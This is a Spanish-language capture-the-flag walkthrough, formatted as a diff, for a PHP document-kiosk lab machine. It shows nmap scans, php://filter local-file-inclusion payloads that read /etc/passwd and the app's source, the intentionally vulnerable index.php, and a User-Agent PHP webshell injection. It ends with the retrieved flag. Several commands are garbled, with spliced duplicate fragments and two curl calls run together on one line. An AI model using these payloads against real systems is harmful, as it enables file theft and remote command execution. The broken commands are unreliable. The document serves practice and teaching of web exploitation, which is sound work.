@@ -1,1 +1,250 @@
+#Overflowthejackpot:lostfortuneincluded walkthrough.
+#Los cambios de ip en la máquina se deben a que la he realizado en varios días, o al reinicio de la misma.
 
+Comienzo con un escaneo de todos los puertos.
+
+sudo nmap -p- 10.130.183.168
+[sudo] contraseña para mksk:     
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-02 14:29 CEST
+Nmap scan report for 10.130.183.168
+Host is up (0.029s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
+
+Y otro -sVC para completar una enumeración básica.
+
+sudo nmap -sVC -p 22,80 10.130.183.168
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-02 14:30 CEST
+Nmap scan report for 10.130.183.168
+Host is up (0.031s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 17:06:59:d3:cf:c6:e6:49:3d:3c:7c:51:77:1d:6a:87 (ECDSA)
+|_  256 25:d3:ca:3b:6a:e3:36:b4:2b:50:cd:8b:89:d6:0e:8f (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: VILLAGE ARCHIVE TERMINAL v2.3
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
+
+Aparte del title no he sacado mucho más con este escaneo.
+
+Voy a ver la web.
+Veo algo interesante. Se pasa el archivo que se quiere ver por la url.
+
+Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.
+AVAILABLE DOCUMENTS:
+
+    village_schedule.pdf
+    important.png
+
+Request format: ?doc=<filename>
+Only .pdf and .png documents are served from this terminal. 
+
+Pruebo una payload de path traversal básica sin éxito.
+
+http://10.130.183.168/?doc=../../../../etc/passwd
+Only .pdf and .png village documents may be viewed.
+
+Sigo probando varias payloads. Saco en claro que esta sanitizando los /.
+
+Pruebo la siguiente.
+
+curl "http://10.130.183.168/?doc=php://filter/convert.base64-encode/resource=/etc/passwd"
+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAyOjEwNDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAzOjEwNjo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTA6Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdHNzOng6MTA2OjExMTpUUE0gc29mdHdhcmUgc3RhY2ssLCw6L3Zhci9saWIvdHBtOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDc6MTEyOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDg6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjExMDoxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTE6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQplYzItaW5zdGFuY2UtY29ubmVjdDp4OjExMjo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgp1YnVudHU6eDoxMDAwOjEwMDA6VWJ1bnR1Oi9ob21lL3VidW50dTovYmluL2Jhc2gKbHhkOng6OTk4OjEwMDo6L3Zhci9zbmFwL2x4ZC9jb21tb24vbHhkOi9iaW4vZmFsc2UKZnd1cGQtcmVmcmVzaDp4OjExMzoxMTk6Znd1cGQtcmVmcmVzaCB1c2VyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpkaGNwY2Q6eDoxMTQ6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCnBvbGtpdGQ6eDo5OTc6OTk3OlVzZXIgZm9yIHBvbGtpdGQ6LzovdXNyL3NiaW4vbm9sb2dpbgo=
+
+Vale, si lo paso por cibercheff me da el archivo /etc/passwd.
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
+
+Ahora saco el código de index.php para ver exactamente como sanitiza.
+
+curl -s "http://10.130.183.168/?doc=php://filter/convert.base64-encode/resource=index.php" | base64 -der/convert.base64-encode/resource=index.php" | base64 -d
+<?php
+$doc = isset($_GET['doc']) ? $_GET['doc'] : '';
+
+$decoys = ['village_schedule.pdf', 'important.png'];
+
+// If a doc param was sent, serve it (this is the vulnerable path)
+if ($doc !== '') {
+
+    // stage 1: naive single-pass traversal strip
+    $doc = str_replace('../', '', $doc);
+
+    $base = __DIR__ . '/village_docs/';
+    $is_wrapper = (strpos($doc, '://') !== false);
+
+    if (!$is_wrapper) {
+        // stage 2: extension whitelist, only ever applied to plain filenames
+        if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
+            http_response_code(403);
+            die('Only .pdf and .png village documents may be viewed.');
+        }
+        $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
+    } else {
+        // wrapper protocols were never covered by the whitelist check above
+        $path = $doc;
+    }
+
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: inline; filename="' . basename($doc) . '"');
+    readfile($path);
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>VILLAGE ARCHIVE TERMINAL v2.3</title>
+<style>
+    body {
+        background-color: #060a0a;
+        background-image:
+            linear-gradient(rgba(45, 212, 191, 0.06) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(45, 212, 191, 0.06) 1px, transparent 1px);
+        background-size: 28px 28px;
+        color: #2dd4bf;
+        font-family: 'Courier New', monospace;
+        margin: 0;
+        padding: 40px;
+        min-height: 100vh;
+    }
+    .terminal {
+        max-width: 720px;
+        margin: 0 auto;
+        background: rgba(6, 10, 10, 0.85);
+        border: 1px solid #2dd4bf;
+        border-radius: 2px;
+        padding: 24px;
+        box-shadow: 0 0 24px rgba(45, 212, 191, 0.12);
+    }
+    h1 {
+        font-size: 20px;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        border-bottom: 1px dotted #2dd4bf;
+        padding-bottom: 10px;
+        margin: 0 0 4px;
+    }
+    .tagline {
+        font-size: 11px;
+        letter-spacing: 2px;
+        color: #0f766e;
+        text-transform: uppercase;
+        margin: 0 0 20px;
+    }
+    .prompt {
+        color: #5eead4;
+        margin-top: 20px;
+        letter-spacing: 1px;
+        font-size: 13px;
+    }
+    ul {
+        list-style: none;
+        padding: 0;
+    }
+    li {
+        margin: 8px 0;
+    }
+    a {
+        color: #2dd4bf;
+        text-decoration: none;
+        border: 1px dotted #115e59;
+        padding: 6px 12px;
+        display: inline-block;
+        width: 260px;
+        transition: background 0.15s, color 0.15s;
+    }
+    a:hover {
+        background: #2dd4bf;
+        color: #060a0a;
+        border-color: #2dd4bf;
+    }
+    .footer {
+        margin-top: 30px;
+        font-size: 12px;
+        color: #0f766e;
+        border-top: 1px dotted #115e59;
+        padding-top: 10px;
+    }
+    code {
+        color: #5eead4;
+    }
+</style>
+</head>
+<body>
+<div class="terminal">
+    <h1>&gt; Secret Village Archive Terminal</h1>
+    <p class="tagline">village kiosk // read-only access</p>
+    <p>Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.</p>
+
+    <div class="prompt">AVAILABLE DOCUMENTS:</div>
+    <ul>
+        <?php foreach ($decoys as $d): ?>
+        <li><a href="?doc=<?php echo urlencode($d); ?>"><?php echo htmlspecialchars($d); ?></a></li>
+        <?php endforeach; ?>
+    </ul>
+
+    <div class="footer">
+        Request format: <code>?doc=&lt;filename&gt;</code><br>
+        Only .pdf and .png documents are served from this terminal.
+    </div>
+</div>
+</body>
+</html>
+
+Inyecto la siguiente línea para conseguir una webshell.
+
+curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://10.130.183.168/"
+
+Tras un rato de probar a conseguir una shell, he vuelto a probar algunas payloads a ver si encontraba la flag en el mismo directorio.
+
+Tras unos intentos, la siguiente me ha sacado la flag.
+
+curl -s "http://10.130.183.168/?doc=php://filter/convert.base64-encode/resource=/var/www/html/flag.txt" curl 'http://10.130.183.168/?doc=php://filter/read=convert.base64-encode/resource=/var/www/flag.txt' | base64 -d
+THM{wr4pp3rs_****************}
